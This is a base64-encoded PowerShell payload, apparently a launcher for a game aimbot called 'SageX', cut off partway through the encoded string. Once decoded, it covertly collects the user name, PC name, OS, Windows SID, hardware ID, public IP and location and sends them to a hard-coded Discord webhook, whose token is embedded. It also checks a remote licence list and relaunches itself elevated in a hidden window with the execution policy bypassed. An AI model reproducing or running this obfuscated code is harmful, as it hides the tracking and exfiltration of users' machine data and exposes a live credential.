$payload = 'Q2xlYXItSG9zdA0KDQojID09PT09PT09PT09PT09PT09PT09IFNJRCBDT0xMRUNUSU9OIChNT1ZFRCBVUCkgPT09PT09PT09PT09PT09PT09PT0NCnRyeSB7DQogICAgJHNpZCA9IChbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLlVzZXIuVmFsdWUNCiAgICBXcml0ZS1Ib3N0ICJgblsqXSBZb3VyIFNJRDogJHNpZCIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNCn0NCmNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJbIV0gRmFpbGVkIHRvIGdldCBTSUQ6ICRfIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICRzaWQgPSAiVW5hdmFpbGFibGUiDQp9DQoNCiMgPT09PT09PT09PT09PT09PT09PT0gSU1QUk9WRUQgV0VCSE9PSyBCTE9DSyA9PT09PT09PT09PT09PT09PT09PQ0KJHdlYmhvb2tVcmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4Njc0NzczMDgwNTc4ODcwMi9Sc0RxNjl3VVhnSFZFeGdRVFNpWEFBWElHOWlJM1h2X0dKbkVtcVQ0SDJ6TEo3QkNwTTR2TFFrc2JhdU42TTk0ZkpobyINCg0KZnVuY3Rpb24gU2VuZC1XZWJob29rTWVzc2FnZSB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UsDQogICAgICAgIFtzdHJpbmddJHN0YXR1cyA9ICJpbmZvIg0KICAgICkNCiAgICANCiAgICB0cnkgew0KICAgICAgICAkdXNlciA9ICRlbnY6VVNFUk5BTUUNCiAgICAgICAgJHBjTmFtZSA9ICRlbnY6Q09NUFVURVJOQU1FDQogICAgICAgICRvcyA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5DYXB0aW9uDQogICAgICAgICR0aW1lID0gR2V0LURhdGUgLUZvcm1hdCAieXl5eS1NTS1kZCBISDptbTpzcyINCiAgICAgICAgJGh3aWQgPSAoR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0KS5VVUlEDQogICAgICAgICRoYXNoZWRIV0lEID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUoKS5Db21wdXRlSGFzaChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRod2lkKSkpIC1yZXBsYWNlICItIiwgIiINCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJGlwSW5mbyA9IEludm9rZS1SZXN0TWV0aG9kIC1VcmkgImh0dHA6Ly9pcC1hcGkuY29tL2pzb24iIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgICAgICAkaXAgPSAkaXBJbmZvLnF1ZXJ5DQogICAgICAgICAgICAkY291bnRyeSA9ICRpcEluZm8uY291bnRyeQ0KICAgICAgICAgICAgJHJlZ2lvbiA9ICRpcEluZm8ucmVnaW9uTmFtZQ0KICAgICAgICAgICAgJGNpdHkgPSAkaXBJbmZvLmNpdHkNCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAkaXAgPSAiVW5hdmFpbGFibGUiDQogICAgICAgICAgICAkY291bnRyeSA9ICJVbmF2YWlsYWJsZSINCiAgICAgICAgICAgICRyZWdpb24gPSAiVW5hdmFpbGFibGUiDQogICAgICAgICAgICAkY2l0eSA9ICJVbmF2YWlsYWJsZSINCiAgICAgICAgfQ0KDQogICAgICAgICMgRGV0ZXJtaW5lIGNvbG9yIGJhc2VkIG9uIHN0YXR1cw0KICAgICAgICAkY29sb3IgPSBzd2l0Y2ggKCRzdGF0dXMpIHsNCiAgICAgICAgICAgICJzdWNjZXNzIiB7IDY1MjgwIH0gICAjIEdyZWVuDQogICAgICAgICAgICAiZXJyb3IiICAgeyAxNjcxMTY4MCB9ICMgUmVkDQogICAgICAgICAgICAid2FybmluZyIgeyAxNjc3Njk2MCB9ICMgWWVsbG93DQogICAgICAgICAgICBkZWZhdWx0ICAgeyA0ODg2NzU0IH0gICMgQmx1ZQ0KICAgICAgICB9DQoNCiAgICAgICAgJGVtYmVkID0gQHsNCiAgICAgICAgICAgIHRpdGxlID0gIjw6RGVhZDoxMzQ2NzA1MDc2NjI2MDAyMDMzPiBTYWdlWCBFeGVjdXRlZCAtICRzdGF0dXMiLlRvVXBwZXIoKQ0KICAgICAgICAgICAgY29sb3IgPSAkY29sb3INCiAgICAgICAgICAgIHRpbWVzdGFtcCA9IChHZXQtRGF0ZSkuVG9TdHJpbmcoIm8iKQ0KICAgICAgICAgICAgZmllbGRzID0gQCgNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIjxhOnRyaWNrX3N1cHJlbWU6MTM0NjY5NDI4MDM4NjcwNzQ2Nj4gVXNlciI7IHZhbHVlID0gJHVzZXI7IGlubGluZSA9ICR0cnVlIH0sDQogICAgICAgICAgICAgICAgQHsgbmFtZSA9ICI8YTp0cmlja19zdXByZW1lOjEzNDY2OTQxOTMxNTc3NjcyNjk+IFBDIE5hbWUiOyB2YWx1ZSA9ICRwY05hbWU7IGlubGluZSA9ICR0cnVlIH0sDQogICAgICAgICAgICAgICAgQHsgbmFtZSA9ICI8OndpbmRvd3M6OTA0NzkyMzM2MDU4NDI1MzQ2PiBPUyI7IHZhbHVlID0gJG9zOyBpbmxpbmUgPSAkZmFsc2UgfSwNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIjw6dHJpY2tfc3VwcmVtZToxMzQ2NDQ2NTk4NzkxNzU3ODg0PiBTSUQiOyB2YWx1ZSA9ICRzaWQ7IGlubGluZSA9ICRmYWxzZSB9LA0KICAgICAgICAgICAgICAgIEB7IG5hbWUgPSAiPDp0cmlja19zdXByZW1lOjEzNDY0NDY1OTg3OTE3NTc4ODQ+IEhXSUQgKGhhc2hlZCkiOyB2YWx1ZSA9ICRoYXNoZWRIV0lEOyBpbmxpbmUgPSAkZmFsc2UgfSwNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIjw6dHJpY2tfc3VwcmVtZToxMzQ2NDQ2NTk4NzkxNzU3ODg0PiBJUCBBZGRyZXNzIjsgdmFsdWUgPSAkaXA7IGlubGluZSA9ICR0cnVlIH0sDQogICAgICAgICAgICAgICAgQHsgbmFtZSA9ICI8OnRyaWNrX3N1cHJlbWU6MTM0NjQ0NjU5ODc5MTc1Nzg4ND4gTG9jYXRpb24iOyB2YWx1ZSA9ICIkY2l0eSwgJHJlZ2lvbiwgJGNvdW50cnkiOyBpbmxpbmUgPSAkdHJ1ZSB9LA0KICAgICAgICAgICAgICAgIEB7IG5hbWUgPSAiPGE6NzI2NzQ3ODIxMzczNjUzMDcyOjEzNDY3MDUwNDg5NDc3ODU4MjI+IFRpbWUiOyB2YWx1ZSA9ICR0aW1lOyBpbmxpbmUgPSAkZmFsc2UgfSwNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIlN0YXR1cyBNZXNzYWdlIjsgdmFsdWUgPSAkbWVzc2FnZTsgaW5saW5lID0gJGZhbHNlIH0NCiAgICAgICAgICAgICkNCiAgICAgICAgfQ0KDQogICAgICAgICRwYXlsb2FkID0gQHsNCiAgICAgICAgICAgIHVzZXJuYW1lID0gIlNhZ2VYIExvZ2dlciINCiAgICAgICAgICAgIGVtYmVkcyA9IEAoJGVtYmVkKQ0KICAgICAgICB9IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICAgICAgJGhlYWRlcnMgPSBAew0KICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSIgPSAiYXBwbGljYXRpb24vanNvbiINCiAgICAgICAgfQ0KDQogICAgICAgICR3ZWJob29rUmVzcG9uc2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rVXJsIC1NZXRob2QgUG9zdCAtQm9keSAkcGF5bG9hZCAtSGVhZGVycyAkaGVhZGVycyAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICAgIyBJZiBpdCdzIGEgcmF0ZSBsaW1pdCBpc3N1ZQ0KICAgICAgICBpZiAoJF8uRXhjZXB0aW9uLlJlc3BvbnNlIC1hbmQgJF8uRXhjZXB0aW9uLlJlc3BvbnNlLlN0YXR1c0NvZGUgLWVxIDQyOSkgew0KICAgICAgICAgICAgJHJldHJ5QWZ0ZXIgPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuSGVhZGVyc1snUmV0cnktQWZ0ZXInXQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQojIFRlc3QgdGhlIHdlYmhvb2sgY29ubmVjdGlvbiBmaXJzdA0KJHdlYmhvb2tUZXN0ID0gU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAiSW5pdGlhbCBjb25uZWN0aW9uIHRlc3QiIC1zdGF0dXMgImluZm8iDQppZiAoLW5vdCAkd2ViaG9va1Rlc3QpIHsNCiAgICBXcml0ZS1Ib3N0ICJbIV0gV2ViaG9vayBpbml0aWFsaXphdGlvbiBmYWlsZWQuIENvbnRpbnVpbmcgd2l0aG91dCB3ZWJob29rIGxvZ2dpbmcuIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KfQ0KDQojID09PT09PT09PT09PT09PT09PT09IE9UUCBWRVJJRklDQVRJT04gU1lTVEVNID09PT09PT09PT09PT09PT09PT09DQpbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtTeXN0ZW0uTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTINCg0KZnVuY3Rpb24gR2V0LU1hY2hpbmVGaW5nZXJwcmludCB7DQogICAgdHJ5IHsNCiAgICAgICAgJGNwdUlkID0gKEdldC1XbWlPYmplY3QgV2luMzJfUHJvY2Vzc29yIC1FcnJvckFjdGlvbiBTdG9wKS5Qcm9jZXNzb3JJZA0KICAgICAgICAkYmlvc0lkID0gKEdldC1XbWlPYmplY3QgV2luMzJfQklPUyAtRXJyb3JBY3Rpb24gU3RvcCkuU2VyaWFsTnVtYmVyDQogICAgICAgICRkaXNrSWQgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9EaXNrRHJpdmUgLUVycm9yQWN0aW9uIFN0b3ApLlNlcmlhbE51bWJlcg0KICAgICAgICAkbWFjQWRkcmVzcyA9IChHZXQtV21pT2JqZWN0IFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAtRXJyb3JBY3Rpb24gU3RvcCB8IA0KICAgICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQRW5hYmxlZCAtZXEgJHRydWUgfSkuTWFjQWRkcmVzcyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDENCiAgICAgICAgDQogICAgICAgICRjb21iaW5lZElkID0gIiRjcHVJZCRiaW9zSWQkZGlza0lkJG1hY0FkZHJlc3MiDQogICAgICAgICRoYXNoID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkY29tYmluZWRJZCkpDQogICAgICAgICRoYXNoZWRJZCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2gpIC1yZXBsYWNlICItIiwgIiINCiAgICAgICAgDQogICAgICAgIHJldHVybiAkaGFzaGVkSWQuU3Vic3RyaW5nKDAsIDMyKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgICRlcnJvck1zZyA9ICJFcnJvciBnZW5lcmF0aW5nIG1hY2hpbmUgZmluZ2VycHJpbnQ6ICRfIg0KICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gJGVycm9yTXNnIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICBTZW5kLVdlYmhvb2tNZXNzYWdlIC1tZXNzYWdlICRlcnJvck1zZyAtc3RhdHVzICJlcnJvciINCiAgICAgICAgZXhpdA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2VuZXJhdGUtU2VjdXJlT1RQIHsNCiAgICBwYXJhbShbaW50XSRMZW5ndGggPSAxMikNCiAgICANCiAgICB0cnkgew0KICAgICAgICAkdmFsaWRDaGFycyA9ICJBQkNERUZHSEpLTE1OUFFSU1RVVldYWVoyMzQ1Njc4OSINCiAgICAgICAgJHJuZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJhbmRvbU51bWJlckdlbmVyYXRvcl06OkNyZWF0ZSgpDQogICAgICAgICRieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdKCRMZW5ndGgpDQogICAgICAgICRybmcuR2V0Qnl0ZXMoJGJ5dGVzKQ0KICAgICAgICANCiAgICAgICAgJG90cCA9IC1qb2luICgkYnl0ZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkdmFsaWRDaGFyc1skXyAlICR2YWxpZENoYXJzLkxlbmd0aF0NCiAgICAgICAgfSkNCiAgICAgICAgDQogICAgICAgIHJldHVybiAkb3RwDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgJGVycm9yTXNnID0gIkVycm9yIGdlbmVyYXRpbmcgT1RQOiAkXyINCiAgICAgICAgV3JpdGUtSG9zdCAiWyFdICRlcnJvck1zZyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkZXJyb3JNc2cgLXN0YXR1cyAiZXJyb3IiDQogICAgICAgIGV4aXQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFZlcmlmeS1PVFAgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRNYWNoaW5lRmluZ2VycHJpbnQsDQogICAgICAgIFtzdHJpbmddJE9UUCwNCiAgICAgICAgW3N0cmluZ10kRGF0YWJhc2VVUkwNCiAgICApDQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgJG1heFJldHJpZXMgPSAzDQogICAgICAgICRyZXRyeUNvdW50ID0gMA0KICAgICAgICAkcmVtb3RlRGF0YSA9ICRudWxsDQogICAgICAgIA0KICAgICAgICBkbyB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRyZW1vdGVEYXRhID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkRGF0YWJhc2VVUkwgLVVzZUJhc2ljUGFyc2luZyAtRXJyb3JBY3Rpb24gU3RvcCAtQ29udGVudFR5cGUgInRleHQvcGxhaW47IGNoYXJzZXQ9dXRmLTgiDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICAkcmV0cnlDb3VudCsrDQogICAgICAgICAgICAgICAgaWYgKCRyZXRyeUNvdW50IC1nZSAkbWF4UmV0cmllcykgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyAiRmFpbGVkIHRvIGZldGNoIE9UUCBkYXRhYmFzZSBhZnRlciAkbWF4UmV0cmllcyBhdHRlbXB0czogJF8iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSB3aGlsZSAoJHRydWUpDQoNCiAgICAgICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRyZW1vdGVEYXRhKSkgew0KICAgICAgICAgICAgJHdhcm5pbmdNc2cgPSAiRW1wdHkgT1RQIGRhdGFiYXNlIHJlY2VpdmVkIg0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdICR3YXJuaW5nTXNnIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkd2FybmluZ01zZyAtc3RhdHVzICJ3YXJuaW5nIg0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkcGF0dGVybiA9ICIkTWFjaGluZUZpbmdlcnByaW50YDokT1RQYDpcZHs0fS1cZHsyfS1cZHsyfSINCiAgICAgICAgcmV0dXJuICgkcmVtb3RlRGF0YSAtbWF0Y2ggJHBhdHRlcm4pDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgJGVycm9yTXNnID0gIkZhaWxlZCB0byB2ZXJpZnkgT1RQOiAkXyINCiAgICAgICAgV3JpdGUtSG9zdCAiWyFdICRlcnJvck1zZyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkZXJyb3JNc2cgLXN0YXR1cyAiZXJyb3IiDQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtT1RQU3lzdGVtIHsNCiAgICB0cnkgew0KICAgICAgICAkYXBwRGF0YUZvbGRlciA9ICIkZW52OkFQUERBVEFcU0FHRXggUkVHRURJVCINCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkYXBwRGF0YUZvbGRlcikpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGFwcERhdGFGb2xkZXIgLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJExvY2FsU3RvcmFnZVBhdGggPSAiJGFwcERhdGFGb2xkZXJcb3RwLmluaSINCiAgICAgICAgJFJlbW90ZURhdGFiYXNlVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Ub3hpYy1TcGVlZC9TQUctLVgvbWFpbi9vdHBfZGIudHh0Ig0KICAgICAgICAkbWFjaGluZUZpbmdlcnByaW50ID0gR2V0LU1hY2hpbmVGaW5nZXJwcmludA0KICAgICAgICANCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkTG9jYWxTdG9yYWdlUGF0aCkgew0KICAgICAgICAgICAgJGxvY2FsT1RQID0gR2V0LUNvbnRlbnQgJExvY2FsU3RvcmFnZVBhdGggfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ15vdHA9JyB9IHwgRm9yRWFjaC1PYmplY3QgeyAoJF8gLXNwbGl0ICc9JylbMV0gfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJGxvY2FsT1RQKSkgew0KICAgICAgICAgICAgICAgIHRocm93ICJObyBPVFAgZm91bmQgaW4gbG9jYWwgc3RvcmFnZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKC1ub3QgKFZlcmlmeS1PVFAgLU1hY2hpbmVGaW5nZXJwcmludCAkbWFjaGluZUZpbmdlcnByaW50IC1PVFAgJGxvY2FsT1RQIC1EYXRhYmFzZVVSTCAkUmVtb3RlRGF0YWJhc2VVUkwpKSB7DQogICAgICAgICAgICAgICAgJGVycm9yTXNnID0gIkRldmljZSBub3QgYXV0aG9yaXplZC4gRmluZ2VycHJpbnQ6ICRtYWNoaW5lRmluZ2VycHJpbnQgfCBPVFA6ICRsb2NhbE9UUCINCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJgblshXSAkZXJyb3JNc2ciIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgICAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkZXJyb3JNc2cgLXN0YXR1cyAiZXJyb3IiDQogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFBsZWFzZSBjb250YWN0IHN1cHBvcnQuIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIDE1DQogICAgICAgICAgICAgICAgZXhpdA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBTZW5kLVdlYmhvb2tNZXNzYWdlIC1tZXNzYWdlICJPVFAgdmVyaWZpY2F0aW9uIHN1Y2Nlc3NmdWwiIC1zdGF0dXMgInN1Y2Nlc3MiDQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICRuZXdPVFAgPSBHZW5lcmF0ZS1TZWN1cmVPVFAgLUxlbmd0aCAxMg0KICAgICAgICAgICAgJG90cENvbnRlbnQgPSBAKA0KICAgICAgICAgICAgICAgICJbT1RQXSIsDQogICAgICAgICAgICAgICAgImZpbmdlcnByaW50PSRtYWNoaW5lRmluZ2VycHJpbnQiLA0KICAgICAgICAgICAgICAgICJvdHA9JG5ld09UUCIsDQogICAgICAgICAgICAgICAgImdlbmVyYXRlZD0kKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSINCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgJG90cENvbnRlbnQgfCBPdXQtRmlsZSAtRmlsZVBhdGggJExvY2FsU3RvcmFnZVBhdGggLUZvcmNlIC1FbmNvZGluZyBVVEY4DQogICAgICAgICAgICAkd2FybmluZ01zZyA9ICJGSVJTVC1USU1FIFNFVFVQIFJFUVVJUkVELiBGaW5nZXJwcmludDogJG1hY2hpbmVGaW5nZXJwcmludCB8IE9UUDogJG5ld09UUCINCiAgICAgICAgICAgIFdyaXRlLUhvc3QgImBuWyFdICR3YXJuaW5nTXNnIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkd2FybmluZ01zZyAtc3RhdHVzICJ3YXJuaW5nIg0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiYG5bIV0gUGxlYXNlIHJlZ2lzdGVyIHRoaXMgZGV2aWNlIHdpdGggdGhlIGluZm9ybWF0aW9uIGFib3ZlIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFNlbmQgdGhpcyBpbmZvcm1hdGlvbiB0byB0aGUgZGV2ZWxvcGVyIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiYG5bKl0gRXhpdGluZyB1bnRpbCBkZXZpY2UgaXMgYXV0aG9yaXplZC4uLiIgLUZvcmVncm91bmRDb2xvciBHcmF5DQogICAgICAgICAgICBTdGFydC1TbGVlcCAxMA0KICAgICAgICAgICAgZXhpdA0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgJGVycm9yTXNnID0gIk9UUCBTeXN0ZW0gRXJyb3I6ICRfIg0KICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gJGVycm9yTXNnIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICBTZW5kLVdlYmhvb2tNZXNzYWdlIC1tZXNzYWdlICRlcnJvck1zZyAtc3RhdHVzICJlcnJvciINCiAgICAgICAgZXhpdA0KICAgIH0NCn0NCg0KIyA9PT09PT09PT09PT09PT09PT09PSBNQUlOIFNDUklQVCA9PT09PT09PT09PT09PT09PT09PQ0KSW5pdGlhbGl6ZS1PVFBTeXN0ZW0NCkNsZWFyLUhvc3QNCg0KIyBHZXQgU0lEIHdpdGggZXJyb3IgaGFuZGxpbmcNCnRyeSB7DQogICAgJHNpZCA9IChbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLlVzZXIuVmFsdWUNCiAgICBXcml0ZS1Ib3N0ICJgblsqXSBZb3VyIFNJRDogJHNpZCIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNCn0NCmNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJbIV0gRmFpbGVkIHRvIGdldCBTSUQ6ICRfIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgIGV4aXQNCn0NCg0KIyA9PT09PT09PT09PT09PT09PT09PSBBSU1CT1QgPT09PT09PT09PT09PT09PT09PT0NCjwjDQo6OiBCYXRjaC1Qb3dlclNoZWxsIEh5YnJpZCBTY3JpcHQNCjo6IFRoaXMgc2NyaXB0IGNhbiBydW4gaW4gYm90aCBDTUQgYW5kIFBvd2VyU2hlbGwNCjo6IFRvIHJ1biBpbiBDTUQ6ICAgZG91YmxlLWNsaWNrIG9yIGNhbGwgZGlyZWN0bHkNCjo6IFRvIHJ1biBpbiBQUzogICAgcmlnaHQtY2xpY2sgLT4gIlJ1biB3aXRoIFBvd2VyU2hlbGwiDQpAZWNobyBvZmYNCmlmICIlMSI9PSJwcyIgZ290byA6cHMNCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJiB7U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJyV+ZjAnIC1Bcmd1bWVudExpc3QgJ3BzJyAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVufSINCmV4aXQgL2INCjpwcw0KIz4NCg0KIyA9PT0gRW5oYW5jZWQgQWltYm90IExhdW5jaGVyID09PQ0KIyBQb3dlclNoZWxsLUNvbXBhdGlibGUgVmVyc2lvbg0KW0NvbnNvbGVdOjpPdXRwdXRFbmNvZGluZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgNCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAiU3RvcCINCg0KIyBXaW4zMiBBUEkgRGVmaW5pdGlvbnMNCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KDQpwdWJsaWMgc3RhdGljIGNsYXNzIFdpbjMyRnVuY3Rpb25zIHsNCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KICAgIA0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDb25zb2xlV2luZG93KCk7DQogICAgDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBBbGxvY0NvbnNvbGUoKTsNCn0NCiJADQoNCiMgQ29uZmlndXJhdGlvbg0KJGFwcERhdGFEaXIgPSBKb2luLVBhdGggJGVudjpBUFBEQVRBICJTQUdFeCBSRUdFRElUIg0KJHRlbXBQeSA9IEpvaW4tUGF0aCAkYXBwRGF0YURpciAiU0FHRXggUkVHRURJVC5weSINCiRtb2RlbEZpbGUgPSAieW9sb3Y4bi5wdCINCiRtb2RlbEhhc2ggPSAiMzFFMjBEREUzREVGMDlFMkNGOTM4QzdCRTZGRTIzRDkxNTBCQkJFNTAzOTgyQUYxMzM0NTcwNjUxNUYyRUY5NSINCiRtb2RlbFVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vdWx0cmFseXRpY3MvYXNzZXRzL3JlbGVhc2VzL2Rvd25sb2FkL3YwLjAuMC95b2xvdjhuLnB0Ig0KDQojIENyZWF0ZSBhcHAgZGlyZWN0b3J5IGlmIGl0IGRvZXNuJ3QgZXhpc3QNCmlmICgtbm90IChUZXN0LVBhdGggJGFwcERhdGFEaXIpKSB7DQogICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkYXBwRGF0YURpciAtRm9yY2UgfCBPdXQtTnVsbA0KfQ0KDQojIEZ1bmN0aW9ucw0KZnVuY3Rpb24gU2hvdy1Db25zb2xlIHsNCiAgICB0cnkgew0KICAgICAgICBpZiAoLW5vdCBbV2luMzJGdW5jdGlvbnNdOjpBbGxvY0NvbnNvbGUoKSkgew0KICAgICAgICAgICAgJGNvbnNvbGVXaW5kb3cgPSBbV2luMzJGdW5jdGlvbnNdOjpHZXRDb25zb2xlV2luZG93KCkNCiAgICAgICAgICAgIGlmICgkY29uc29sZVdpbmRvdyAtbmUgW0ludFB0cl06Olplcm8pIHsNCiAgICAgICAgICAgICAgICBbV2luMzJGdW5jdGlvbnNdOjpTaG93V2luZG93KCRjb25zb2xlV2luZG93LCA1KSB8IE91dC1OdWxsICMgU1dfU0hPVw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgV3JpdGUtV2FybmluZyAiQ291bGQgbm90IHNob3cgY29uc29sZSB3aW5kb3c6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gVG